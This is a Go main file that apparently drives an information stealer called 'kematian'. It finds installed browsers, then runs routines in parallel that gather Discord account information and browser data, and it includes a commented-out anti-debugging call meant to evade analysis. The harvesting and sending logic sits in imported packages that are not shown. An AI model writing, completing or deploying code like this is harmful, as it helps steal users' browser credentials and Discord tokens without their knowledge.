package main

import (
	"kdot/kematian/browsers"
	"kdot/kematian/browsers/finder"
	"kdot/kematian/discord"
	"os"
	"sync"
	_ "github.com/mattn/go-sqlite3"
)

func main() {

	//go anti.AntiDebug()

	browsersPaths := finder.FindBrowsers()

	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		defer wg.Done()
		discord.WriteDiscordInfo(browsersPaths)
	}()

	// Start browsers.GetBrowserData in a goroutine
	go func() {
		defer wg.Done()
		browsers.GetBrowserData(browsersPaths)
	}()

	wg.Wait()

	os.Exit(0)
}
